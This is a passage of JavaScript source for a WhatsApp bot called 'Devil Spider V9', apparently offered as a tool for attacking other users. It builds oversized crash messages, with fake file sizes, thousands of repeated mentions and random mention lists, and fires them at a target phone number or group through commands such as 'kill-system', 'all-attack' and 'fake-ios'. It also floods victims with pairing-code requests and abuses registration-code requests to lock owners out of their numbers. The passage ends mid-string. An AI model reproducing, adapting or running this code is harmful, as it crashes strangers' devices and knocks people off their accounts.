          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "᳀ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 メ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: spider,
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "🏴‍☠️ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 🦣\n" + "@6285655649546".repeat(17000),
        },
        nativeFlowMessage: {
         buttons: [{
           name: "cta_url",
           buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐒𝐩𝐢𝐝𝐞𝐫 𝐂𝐫𝐚𝐬𝐡 ϟ〽️', url: \"https://youtube.com/king_sam_hub\", merchant_url: \"https://youtube.com/king_sam_hub\" }",
          },
          {
           name: "call_permission_request",
           buttonParamsJson: "{}",
          },
         ],
         messageParamsJson: "{}",
        },
        contextInfo: {
         mentionedJid: ["6285655649546@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9〽️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
   console.log(chalk.green("Send Bug By Spider〽️"));
  };

//================================================//
async function crtVid(url) {
    const { videoMessage } = await generateWAMessageContent({
        image: { url }
        }, {
            upload: sam.waUploadToServer
        })
    return videoMessage
}
//=================================================//
async function prM(params) {
    return await prepareWAMessageMedia(params, { upload: sam.waUploadToServer })
}
//=================================================//
const reply = async (teks) => {
    await sleep(500)
    return sam.sendMessage(m.chat, {
        contextInfo: {
            mentionedJid: [
                m.sender
            ],
            externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: false,
                title: `𝙎𝙋𝙄𝘿𝙀𝙍-𝙑9 `,
                body: `𝐛𝐲 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                previewType: "VIDEO",
                thumbnailUrl: `https://i.imgur.com/Lmo7eVS.jpeg`,
                sourceUrl: `${global.url1}`,
                mediaUrl: `${global.url1}`
            }
        },
        text: teks
    }, {
        quoted: m
    })
    await sleep(500)
}
//=================================================//

//=================================================//
// 

// 
let handled = false
//=================================================//
if (m.message) {
    console.log(chalk.green.bgHex("#e74c3c").bold(`\n💫 DEVIL SPIDER V9 💫`))
    console.log(chalk.green.bgHex("#e74c3c").bold(`✉️ Message`))
    console.log(chalk.black.bgHex("#00FF00")(`📅 Date: ${new Date().toLocaleString()} \n💬 Message: ${m.body || m.mtype} \n🗣️ From: ${m.pushName} \n🔢 User JID: ${m.sender}`))
    if (m.isGroup) {
        console.log(chalk.black.bgHex("#00FF00")(`🏷️ Grup: ${groupName}`))
        console.log(chalk.black.bgHex("#00FF00")(`🧷 GroupJid: ${m.chat}`))
    }
   
}



if (!handled) {
switch (command) {
//===========================================//
case 'menu': case 'spider':{
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let kimg=`
     \`𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥-𝗩9\`    
┏━━━━━━━━━━━━━━━━━━━
┃ ◉ 𝙷𝚒  ${m.pushName} 
┃ ◉ 𝙿𝚛𝚎𝚏𝚒𝚡 : ${prefix}
┃ ◉ 𝚙𝚒𝚗𝚐: ${latensi.toFixed(4)}
┃ ◉ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${run}
┗━━━━━━━━━━━━━━━━━━━
        \`𝗢𝗪𝗡𝗘𝗥 𝗖𝗠𝗗\` 
┏━━━━━━━━━━━━━━━━━━━
┃ ◈ addprem
┃ ◈ addowner
┃ ◈ delprem
┃ ◈ delowner
┗━━━━━━━━━━━━━━━━━━━
      \`𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗠𝗗\` 
┏━━━━━━━━━━━━━━━━━━━
┃ ◈ trash 254###
┃ ◈ sgc ( group )
┗━━━━━━━━━━━━━━━━━━━
        \`𝗢𝗧𝗛𝗘𝗥 𝗖𝗠𝗗\` 
┏━━━━━━━━━━━━━━━━━━━
┃ ◈ ping
┃ ◈ runtime
┖━━━━━━━━━━━━━━━━━━━
  © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
sam.sendMessage(m.chat, { 
	           text: kimg,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝐃𝐄𝐕𝐈𝐋 𝐒𝐏𝐈𝐃𝐄𝐑 𝐕9`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://i.imgur.com/J0a6uwN.jpeg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await sam.sendMessage(m.chat, {
audio: samido,
mimetype: 'audio/mpeg'
}, { quoted: m
})
}
break
case 'trash': {
	
			if (!isCreator) return reply(mess.owner)
			if (!q) return reply(`*Cannot Procces your Request*\n\n_Use : trash Number_\n_Example : .trash 254xx_\n\n📌 𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9`);
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return reply(`*Syntax Error!*\n\n★ Use : trash Number\n📌 Example : .trash 2547xx_\n\n📌 𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9 📌`)
			let target = incTarget + '@s.whatsapp.net'
			global.jumlah = text.split("|")[1]

			let sections = [{
			
					title: '⌜𝐃𝐄𝐕𝐈𝐋 𝐒𝐏𝐈𝐃𝐄𝐑 𝐕9⌟',
					highlight_label: "🏴‍☠️𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐀𝐓𝐓𝐀𝐂𝐊🏴‍☠️",
					rows: [{
						title: '💥 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 🦄',
						id: `.invisible ${incTarget}`
					}]
				},
				{   
					highlight_label: "🏴‍☠️ 𝐃𝐄𝐒𝐓 🏴‍☠️",
					rows: [{
						title: '𝐋𝐄𝐆𝐄𝐍𝐃 𝐊𝐈𝐋𝐋𝐄𝐑',
						id: `.dest ${incTarget}`
					}]
				},
				{   
					highlight_label: "🏴‍☠️ 𝐃𝐀𝐍𝐆𝐄𝐑 🦣",
					rows: [{
						title: '🙃 𝐊𝐈𝐋𝐋 𝐓𝐀𝐑𝐆𝐄𝐓 𝐏𝐇𝐎𝐍𝐄 🕷️',
						id: `.kill-system ${incTarget}`
					}]
				},
				{
				
					highlight_label: "🏴‍☠️𝐀𝐋𝐋 𝐈𝐍 𝐎𝐍𝐄🏴‍☠️",
					rows: [{
						title: '👽𝐒𝐏𝐈𝐃𝐄𝐑 𝐊𝐈𝐋𝐋🦈',
						description: `All_in_one`,
						id: `.all-attack`
					}]
				},
				{
					title: '⌜ 𝐆𝐑𝐎𝐔𝐏 𝐁𝐔𝐆𝐒 ⌟',
					highlight_label: "🏴‍☠️𝐘𝐨𝐮 𝐌𝐚𝐲 𝐀𝐥𝐬𝐨 𝐂𝐫𝐚𝐬𝐡🏴‍☠️",
					rows: [{
						title: '👽𝐖𝐄𝐁 𝐆𝐂🦈',
						description: `🦄`,
						id: `.sgc`
					}]
				},
				
				{
					title: '⌜ 𝐈𝚯𝐒 ⌟',
					highlight_label: "🤖𝐈𝐧𝐯𝐢𝐬𝐢𝐛𝐥𝐞 𝐭𝐨 𝐭𝐡𝐞 𝐓𝐚𝐫𝐠𝐞𝐭🫶",
					rows: [{
						title: '🧚‍♀️ 𝐂𝐑𝐀𝐒𝐇-𝐈𝐎𝐒💥',
						description: `🐠`,
						id: `.fake-ios ${incTarget}|8`
					}]
				},
				{
					title: '⌜ 𝐇𝚯𝐋𝐃 ⌟',
					rows: [{
						title: '𝐓𝐄𝐌𝐏-𝐁𝐀𝐍',
						id: `.temp-ban ${incTarget}`
					}]
				},
					{
					title: '⌜ 𝐇𝚯𝐋𝐃 ⌟',
					rows: [{
						title: '𝐒𝐏𝐀𝐌-𝐏𝐀𝐈𝐑',
						id: `.spam-pair ${incTarget}|250`
					}]
				}
			]

			let listMessage = {
				title: `╫ 𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9 ╫`,
				sections
			};
	let msg = generateWAMessageFromContent(m.chat, {
				viewOnceMessage: {
					message: {
						"messageContextInfo": {
							"deviceListMetadata": {},
							"deviceListMetadataVersion": 2
						},
						interactiveMessage: proto.Message.InteractiveMessage.create({
							contextInfo: {
								mentionedJid: [m.sender],
								isForwarded: true,
								forwardingScore: 999,
								forwardedNewsletterMessageInfo: {
									newsletterJid: '120363320283062687@newsletter',
									newsletterName: '☠️⃟S҉ P҉ I҉ D҉ E҉ R҉  C҉ R҉ A҉ S҉ H҉ 🦄',
									serverMessageId: -1
								},
								businessMessageForwardInfo: {
									businessOwnerJid: sam.decodeJid(sam.user.id)
								},
							},
							body: proto.Message.InteractiveMessage.Body.create({
								text: ''
							}),
							footer: proto.Message.InteractiveMessage.Footer.create({
								text: `⿻  ⌜ 𝐒𝐏𝐈𝐃𝐄𝐑 𝐕9 ⌟  ⿻`
							}),
							header: proto.Message.InteractiveMessage.Header.create({
								title: `\n⃟🕷️ S҉ P҉ I҉ D҉ E҉ R҉  V҉9 🔥⃟\n›› 𝐓𝐫𝐚𝐬𝐡 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${incTarget}\n`,
								subtitle: `️`,
								hasMediaAttachment: true,
								...(await prepareWAMessageMedia({
									image: {
										url: 'https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg'
									}
								}, {
									upload: sam.waUploadToServer
								}))
							}),
							nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
								buttons: [{
									"name": "single_select",
									"buttonParamsJson": JSON.stringify(listMessage)
								}, ]
							})
						})
					}
				}
			}, {})

			await sam.relayMessage(msg.key.remoteJid, msg.message, {
				messageId: msg.key.id
			})
		}
		break
case 'dest': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`Example: ${prefix + command} 2547×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await sam.onWhatsApp(target);
  if (target == "254742491666") {
    return;
    }
    if (target == "254104301695") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("You will die,,,,Utakufa vibaya wewe 💀");
}
reply(`Wait Your Target is being Utilised`)
for (let i = 0; i < 2; i++) {
await InVisiXz(target, sam, cct = true, ptcp = true)
await TrashSystem(target, sam, cct = true, ptcp = true)
}
reply(`
┏━━━━━━━━━━━━━━━━━━━━━
┃ ▣ 𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗢𝗪𝗡
┃ ⎐ 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗 𝗕𝗬 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩9
┗━━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━━
┃߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
┃֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
┃࿉ 𝐔𝐒𝐈𝐍𝐆 : ${command}
┗━━━━━━━━━━━━━━━━━━━━━
   ꀦ 𝗡𝗢𝗧𝗘: 
┏━━━━━━━━━━━━━━━━━━━━━
┃☘ *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
┃☘ *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*
┗━━━━━━━━━━━━━━━━━━━━━`)
await sleep(2000)
await sam.sendMessage(m.chat, {
audio: bugaudio,
mimetype: 'audio/mpeg'
}, { quoted: m
})
}
break
		case 'kill-system': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`Example: ${prefix + command} 2547×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await sam.onWhatsApp(target);
  if (target == "254742491666") {
    return;
    }
    if (target == "254104301695") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("You will die,,,,Utakufa vibaya wewe 💀");
  }
reply(`Wait Your Target is being Utilised`)
// Function to convert text to invisible characters
   await TrashSystem(target, sam, cct = true, ptcp = true)
await TrashSystem(target, sam, cct = true, ptcp = true)
  await TrashSystem(target, sam, cct = true, ptcp = true)
reply(`
┏━━━━━━━━━━━━━━━━━━━━━
┃ ▣ 𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗢𝗪𝗡
┃ ⎐ 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗 𝗕𝗬 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩9
┗━━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━━
┃߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
┃֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
┃࿉ 𝐔𝐒𝐈𝐍𝐆 : ${command}
┗━━━━━━━━━━━━━━━━━━━━━
   ꀦ 𝗡𝗢𝗧𝗘: 
┏━━━━━━━━━━━━━━━━━━━━━
┃☘ *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
┃☘ *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*
┗━━━━━━━━━━━━━━━━━━━━━`)
await sleep(2000)
await sam.sendMessage(m.chat, {
audio: bugaudio,
mimetype: 'audio/mpeg'
}, { quoted: m
})
}
break
case 'all-attack': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`Example: ${prefix + command} 2547×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await sam.onWhatsApp(target);
  if (target == "254742491666") {
    return;
    }
    if (target == "254104301695") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("You will die,,,,Utakufa vibaya wewe 💀");
}
reply(`Wait Your Target is being Utilised`)
// Function to convert text to invisible characters
   await TrashSystem(target, sam, cct = true, ptcp = true)
  await TrashSystem(target, sam, cct = true, ptcp = true)
 await StuckNull(target, sam, cct = true, ptcp = true)
await ZnXIvS(target, sam, cct = true, ptcp = true)
await InVisiXz(target, sam, cct = true, ptcp = true)
 
reply(`
┏━━━━━━━━━━━━━━━━━━━━━
┃ ▣ 𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗢𝗪𝗡
┃ ⎐ 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗 𝗕𝗬 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩9
┗━━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━━
┃߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
┃֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
┃࿉ 𝐔𝐒𝐈𝐍𝐆 : ${command}
┗━━━━━━━━━━━━━━━━━━━━━
   ꀦ 𝗡𝗢𝗧𝗘: 
┏━━━━━━━━━━━━━━━━━━━━━
┃☘ *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
┃☘ *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*
┗━━━━━━━━━━━━━━━━━━━━━`)
await sleep(2000)
await sam.sendMessage(m.chat, {
audio: bugaudio,
mimetype: 'audio/mpeg'
}, { quoted: m
})
}
break
case 'invisible': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`Example: ${prefix + command} 2547×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await sam.onWhatsApp(target);
  if (target == "254742491666") {
    return;
    }
    if (target == "254104301695") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("You will die,,,,Utakufa vibaya wewe 💀");
}
reply(`Wait Your Target is being Utilised`)
// Function to convert text to invisible characters
 await TrashSystem(target, sam, ptcp = true)
await TrashSystem(target, sam, cct = true, ptcp = true)
 await TrashSystem(target, sam, ptcp = true)
  
 
reply(`
┏━━━━━━━━━━━━━━━━━━━━━
┃ ▣ 𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗢𝗪𝗡
┃ ⎐ 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗 𝗕𝗬 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩9
┗━━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━━
┃߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
┃֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
┃࿉ 𝐔𝐒𝐈𝐍𝐆 : ${command}
┗━━━━━━━━━━━━━━━━━━━━━
   ꀦ 𝗡𝗢𝗧𝗘: 
┏━━━━━━━━━━━━━━━━━━━━━
┃☘ *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
┃☘ *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*
┗━━━━━━━━━━━━━━━━━━━━━`)
await sleep(2000)
await sam.sendMessage(m.chat, {
audio: bugaudio,
mimetype: 'audio/mpeg'
}, { quoted: m
})
}
break
case 'killgc': {
   if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`Example: ${prefix + command} gcid`)
target = q
reply(`Wait Your Target is being Utilised`) 

    
    // Function to convert text to invisible characters
    await TrashSystem(target, sam, ptcp = true);
   await aipong(target)
   await XiosVirus(target)
    await TrashSystem(target, sam, cct = true, ptcp = true);
    await aipong(target)

    reply(`
         ┏━━━━━━━━━━━━━━━━━━━━━
         ┃ ▣ 𝗚𝗥𝗢𝗨𝗣  𝗗𝗢𝗪𝗡
         ┃ ⎐ 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗 𝗕𝗬 𝗦𝗽𝗶𝗱𝗲𝗿 𝗩9
         ┗━━━━━━━━━━━━━━━━━━━━━
         ┏━━━━━━━━━━━━━━━━━━━━━
         ┃߷ 𝐆𝐑𝐎𝐔𝐏 𝐈𝐃 : ${target}
         ┃֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
         ┃࿉ 𝐔𝐒𝐈𝐍𝐆 : ${command}
         ┗━━━━━━━━━━━━━━━━━━━━━
         ꀦ 𝗡𝗢𝗧𝗘: 
         ┏━━━━━━━━━━━━━━━━━━━━━
         ┃☘ *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
         ┃☘ *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*
         ┗━━━━━━━━━━━━━━━━━━━━━
    `);

    await sleep(2000);
    await sam.sendMessage(m.chat, {
        audio: bugaudio,
        mimetype: 'audio/mpeg'
    }, { quoted: m });
}
break;
case "spam-pair": {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(`*Example:* ${prefix + command} +2547888888888|150`)
let [targetNumber, attemptCount = "100"] = q.split("|")
let sanitizedPhoneNumber = targetNumber.replace(/[^0-9]/g, '').trim()
let attempts = parseInt(attemptCount)
if (isNaN(attempts)) return reply('The number of attempts must be a number.')

async function spamPairingRequest(sanitizedPhoneNumber, attempts) {
const startTime = Date.now();
const duration = 15 * 60 * 1000; // 15 menit dalam milidetik
        
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('.npm')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

while (Date.now() - startTime < duration) {
let currentAttempts = attempts; // reset attempts per loop
while (currentAttempts > 0) {
try {
const prc = await sucked.requestPairingCode(sanitizedPhoneNumber);
console.log(`_Succes Spam Pairing Code - Number: ${sanitizedPhoneNumber} - Code: ${prc}_`);
} catch (error) {
console.error('An error occurred while requesting the verification code::', error);
}
                
console.log(`Spam Pairing WhatsApp: ${currentAttempts} remaining trials...`);
await new Promise(resolve => setTimeout(resolve, 1000)); // 1 detik per iterasi
currentAttempts--;
}

console.log('Resend in 30 seconds...');
await new Promise(resolve => setTimeout(resolve, 30000)); // Tunggu 30 detik sebelum iterasi berikutnya
}

console.log('Finished. 15 minutes have passed');
}

await spamPairingRequest(sanitizedPhoneNumber, attempts);
}
break;
case "ping": case "speed": { 
let timestamp = speed()
let latensi = speed() - timestamp

         m.reply (`━━━━━━━━━━━━━━━━━\n\◉ 𝙷𝙴𝙻𝙻𝙾 ${m.pushName}\n\━━━━━━━━━━━━━━━━━\n\◈ 𝚂𝙿𝙸𝙳𝙴𝚁 𝚅9 𝚂𝙿𝙴𝙴𝙳   : ${latensi.toFixed(4)} 𝐌𝐒\n\━━━━━━━━━━━━━━━━━`); 
         } 
 break; 
case "runtime":
                let pinga = ` รρเ∂εɾ ѵ9 ɦαร ɓεεɳ αcƭเѵε ƒσɾ ${runtime(process.uptime())}`
               sam.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝚂𝙿𝙸𝙳𝙴𝚁 𝚅9`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: spider ,
                            sourceUrl: 'https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
case 'temp-ban': {
if (!isCreator) return
if (!text) return reply(`*Example:* ${prefix + command} 254|7872627288`)
if (!/|/.test(text)) return reply(`Wrong Usage!!!:\n> *Example:* ${prefix + command} 254|7872627288`)
let numbers = JSON.parse(fs.readFileSync('./database/tb.json'))

let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number

await reply(`Successfully Temporarily Block WhatsApp with number : ${fullNo} Using Commands ${command} Indefinitely this glitch will come back when the bot restarts!!!`)

const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys')
let pino = require("pino")
let { state, saveCreds } = await useMultiFileAuthState('.npm')
let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})

let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724
})

if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possible Registration Interrupted): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}

numbers[fullNo] = { cCode, number };
fs.writeFileSync('./database/tb.json', JSON.stringify(numbers, null, '\t'));
setInterval(() => {
dropNumber()
}, 400)
}
break
case 'addowner': {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`use ${prefix+command} number\nexample ${prefix+command} ${ownNumb}`)
prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
let cek1 = await sam.onWhatsApp(prem1 + `@s.whatsapp.net`)
if (cek1.length == 0) return (`Adding Premium`)
kontributor.push(prem1)
fs.writeFileSync('./database/owner.json', JSON.stringify(kontributor))
reply(`${prem1} You are now spider V9 Owner!!!`)
sam.sendMessage(prem1+'@s.whatsapp.net', {image: {url: `https://i.imgur.com/J0a6uwN.jpeg`}, caption: `You have been added as the bot owener`},{quoted: m})
}
break
case 'delowner': {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`use ${prefix+command} nomor\nExample ${prefix+command} ${ownNumb}`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = kontributor.indexOf(prem2)
kontributor.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(kontributor))
reply(`${prem2} is no longer a bot owner!!!`)
}
break
case 'addprem': {
if (!isCreator) return reply(mess.owner)
if (args.length < 2)
return reply(`*use .addowener 254#### 30d*`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
}
reply("Success Premium")
} else {
addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
reply("Success Via Number")
await sleep(2000)
sam.sendMessage(args[0] + "@s.whatsapp.net", {image: {url: `https://i.imgur.com/J0a6uwN.jpeg`}, caption: `You are a premium member`},{quoted: m })
}
}
break
case 'delprem': {
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return reply(`Use .delprem 254###`)
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
let mentionedPremiumIndex = orgkaya.findIndex(premium => premium.id === m.mentionedJid[i]);
if (mentionedPremiumIndex !== -1) {
orgkaya.splice(mentionedPremiumIndex, 1);
}
}
fs.writeFileSync("./database/premium.json", JSON.stringify(orgkaya));
reply("Success Deleted");
} else {
let targetNumber = args[0] + "@s.whatsapp.net"
let targetPremiumIndex = orgkaya.findIndex(premium => premium.id === targetNumber)
if (targetPremiumIndex !== -1) {
orgkaya.splice(targetPremiumIndex, 1)
fs.writeFileSync("./database/premium.json", JSON.stringify(orgkaya))
reply("Sukses Via Number")
await sleep(2000)
sam.sendMessage(targetNumber, {image: {url: `https://i.imgur.com/J0a6uwN.jpeg`}, caption: `You are no longer a premium member`},{quoted: m })
} else {
reply("Succesful deleted")
}
}
}
break
case 'fake-ios': case 'test-ios': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`use .${command} 2547392784527|1\n`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country coden\n> *Example*: ${prefix + command} 2547392784527`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
reply(ppk + " detik");
reply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await XiosVirus(target)
await XiosPay(target)
await aipong(target)
await sleep(1500)
}
reply(`
         ┏━━━━━━━━━━━━━━━━━━━━━
         ┃ ▣ 𝗧𝗔𝗥𝗚𝗘𝗧  𝗗𝗢𝗪𝗡
         ┃ ⎐ 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗 𝗕𝗬 𝗦𝗽𝗶𝗱𝗲𝗿 𝗩9
         ┗━━━━━━━━━━━━━━━━━━━━━
         ┏━━━━━━━━━━━━━━━━━━━━━
         ┃߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
         ┃֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
         ┃࿉ 𝐔𝐒𝐈𝐍𝐆 : ${command}
         ┗━━━━━━━━━━━━━━━━━━━━━
         ꀦ 𝗡𝗢𝗧𝗘: 
         ┏━━━━━━━━━━━━━━━━━━━━━
         ┃☘ *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
